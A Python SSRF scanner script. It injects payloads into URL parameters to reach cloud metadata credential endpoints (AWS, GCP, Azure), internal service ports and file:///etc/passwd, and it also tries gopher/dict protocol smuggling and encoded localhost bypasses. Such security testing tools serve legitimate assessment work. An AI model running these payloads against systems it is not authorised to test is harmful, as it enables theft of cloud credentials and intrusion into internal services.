#!/usr/bin/env python3
"""
Advanced SSRF Scanner
Tests for Server-Side Request Forgery including cloud metadata access,
internal port scanning, and protocol smuggling
"""

import requests
import json
from datetime import datetime
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, urlunparse

class AdvancedSSRFScanner:
    """Advanced SSRF vulnerability scanner"""

    def __init__(self, target_url, output_file=None):
        self.target_url = target_url
        self.output_file = output_file
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })

        # Cloud metadata endpoints
        self.cloud_metadata = {
            'AWS': [
                'http://169.254.169.254/latest/meta-data/',
                'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                'http://169.254.169.254/latest/user-data/',
            ],
            'GCP': [
                'http://metadata.google.internal/computeMetadata/v1/',
                'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
            ],
            'Azure': [
                'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
                'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
            ],
            'Digital Ocean': [
                'http://169.254.169.254/metadata/v1.json',
            ],
        }

    def scan(self):
        """Run advanced SSRF tests"""
        print(f"[*] Starting advanced SSRF testing on {self.target_url}")

        # Test cloud metadata access
        self._test_cloud_metadata()

        # Test internal port scanning
        self._test_internal_ports()

        # Test protocol smuggling
        self._test_protocol_smuggling()

        # Test DNS rebinding
        self._test_dns_rebinding()

        # Save results
        if self.output_file:
            self._save_results()

        return {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities
        }

    def _test_cloud_metadata(self):
        """Test access to cloud metadata endpoints"""
        print("[*] Testing cloud metadata access...")

        for cloud_provider, endpoints in self.cloud_metadata.items():
            for metadata_url in endpoints:
                if self._test_ssrf_payload(metadata_url, f'{cloud_provider} Metadata'):
                    return

    def _test_internal_ports(self):
        """Test internal port scanning via SSRF"""
        print("[*] Testing internal port scanning...")

        # Common internal services
        internal_targets = [
            ('http://localhost:22', 'SSH'),
            ('http://localhost:3306', 'MySQL'),
            ('http://localhost:5432', 'PostgreSQL'),
            ('http://localhost:6379', 'Redis'),
            ('http://localhost:27017', 'MongoDB'),
            ('http://localhost:9200', 'Elasticsearch'),
            ('http://127.0.0.1:8080', 'Internal Web'),
            ('http://127.0.0.1:8000', 'Internal API'),
            ('http://0.0.0.0:80', 'Local Web'),
        ]

        for target_url, service_name in internal_targets:
            if self._test_ssrf_payload(target_url, f'Internal {service_name}'):
                return

    def _test_protocol_smuggling(self):
        """Test protocol smuggling (gopher, file, etc.)"""
        print("[*] Testing protocol smuggling...")

        # Protocol smuggling payloads
        protocol_payloads = [
            ('file:///etc/passwd', 'File Protocol - /etc/passwd'),
            ('file:///etc/hosts', 'File Protocol - /etc/hosts'),
            ('file:///c:/windows/win.ini', 'File Protocol - Windows'),
            ('gopher://localhost:25/_MAIL', 'Gopher Protocol - SMTP'),
            ('dict://localhost:11211/stats', 'Dict Protocol - Memcached'),
            ('ftp://localhost:21', 'FTP Protocol'),
            ('tftp://localhost:69', 'TFTP Protocol'),
        ]

        for payload, description in protocol_payloads:
            if self._test_ssrf_payload(payload, description):
                return

    def _test_dns_rebinding(self):
        """Test DNS rebinding susceptibility"""
        print("[*] Testing DNS rebinding...")

        # Test localhost variations
        localhost_variations = [
            'http://localhost',
            'http://127.0.0.1',
            'http://0.0.0.0',
            'http://[::1]',
            'http://127.1',
            'http://127.0.1',
            'http://0x7f.0x0.0x0.0x1',
            'http://0177.0.0.1',
            'http://2130706433',  # Decimal representation
        ]

        for variation in localhost_variations:
            if self._test_ssrf_payload(variation, f'Localhost Bypass'):
                return

    def _test_ssrf_payload(self, payload, description):
        """Test single SSRF payload"""
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)

        # Common parameter names for SSRF
        ssrf_params = ['url', 'uri', 'path', 'dest', 'redirect', 'link', 'callback', 'webhook']

        # Find parameter to inject into
        target_param = None
        for param in ssrf_params:
            if param in params:
                target_param = param
                break

        if not target_param and params:
            # Use first parameter
            target_param = list(params.keys())[0]

        if not target_param:
            # Try common parameters anyway
            target_param = 'url'

        # Build test URL
        test_params = params.copy()
        test_params[target_param] = [payload]

        query_string = urlencode(test_params, doseq=True)
        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query_string, parsed.fragment))

        try:
            response = self.session.get(test_url, timeout=15, allow_redirects=False)

            # Check for SSRF indicators
            ssrf_indicators = [
                'root:x:0:0',  # /etc/passwd
                'localhost',
                '127.0.0.1',
                'ami-id',  # AWS metadata
                'instance-id',
                'iam',
                'security-credentials',
                'metadata',
                'SSH-',  # SSH banner
                'MySQL',
                'PostgreSQL',
                'redis',
            ]

            for indicator in ssrf_indicators:
                if indicator in response.text:
                    severity = 'critical'
                    if 'File Protocol' in description or 'metadata' in indicator.lower():
                        severity = 'critical'
                    elif 'Internal' in description:
                        severity = 'high'
                    else:
                        severity = 'high'

                    vuln = {
                        'type': 'Server-Side Request Forgery (SSRF)',
                        'severity': severity,
                        'url': test_url,
                        'payload': payload,
                        'parameter': target_param,
                        'evidence': f'{description} - Found: {indicator}',
                        'description': f'SSRF allows access to {description}',
                        'cwe': 'CWE-918',
                        'impact': 'Access internal services, cloud credentials, file system',
                        'remediation': 'Validate and whitelist allowed URLs/domains'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[!] SSRF found: {description}")
                    return True

            # Check response time for port scanning
            response_time = response.elapsed.total_seconds()

            # Different timing might indicate port open/closed
            if 'localhost' in payload or '127.0.0.1' in payload:
                if response.status_code in [200, 400, 500] and response_time > 0.5:
                    # Might have connected to internal service
                    pass

        except requests.exceptions.Timeout:
            # Timeout might indicate filtered port
            pass
        except requests.exceptions.ConnectionError:
            # Connection error might indicate closed port
            pass
        except Exception as e:
            pass

        return False

    def _save_results(self):
        """Save results to file"""
        results = {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities,
            'summary': {
                'total': len(self.vulnerabilities),
                'critical': sum(1 for v in self.vulnerabilities if v['severity'] == 'critical'),
                'high': sum(1 for v in self.vulnerabilities if v['severity'] == 'high')
            }
        }

        with open(self.output_file, 'w') as f:
            json.dump(results, f, indent=2)


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python3 advanced_ssrf.py <url> [output_file]")
        print("\nExample:")
        print("  python3 advanced_ssrf.py 'https://example.com/fetch?url=test'")
        print("\nTests for:")
        print("  - Cloud metadata access (AWS/GCP/Azure)")
        print("  - Internal port scanning")
        print("  - Protocol smuggling (file://, gopher://)")
        print("  - DNS rebinding / localhost bypass")
        sys.exit(1)

    target = sys.argv[1]
    output = sys.argv[2] if len(sys.argv) > 2 else None

    scanner = AdvancedSSRFScanner(target, output)
    results = scanner.scan()

    print(f"\n[+] Scan complete!")
    print(f"    Total vulnerabilities: {len(results['vulnerabilities'])}")
    if len(results['vulnerabilities']) > 0:
        print(f"    Critical: {sum(1 for v in results['vulnerabilities'] if v['severity'] == 'critical')}")
        print(f"    High: {sum(1 for v in results['vulnerabilities'] if v['severity'] == 'high')}")
